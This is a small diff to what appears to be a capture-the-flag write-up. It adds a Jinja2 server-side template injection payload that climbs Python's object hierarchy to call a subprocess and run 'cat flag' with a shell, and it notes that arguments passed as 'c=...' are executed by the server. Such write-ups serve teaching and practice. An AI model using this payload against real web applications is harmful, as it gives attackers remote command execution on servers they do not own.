@@ -64,4 +64,6 @@
 
 - Save this, install python and run it.
 
-- Now what ever you pass in the arguments `c=...`will be executed by the server.
+- Now what ever you pass in the arguments `c=...`will be executed by the server
+
+- `{{g.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]}}`.
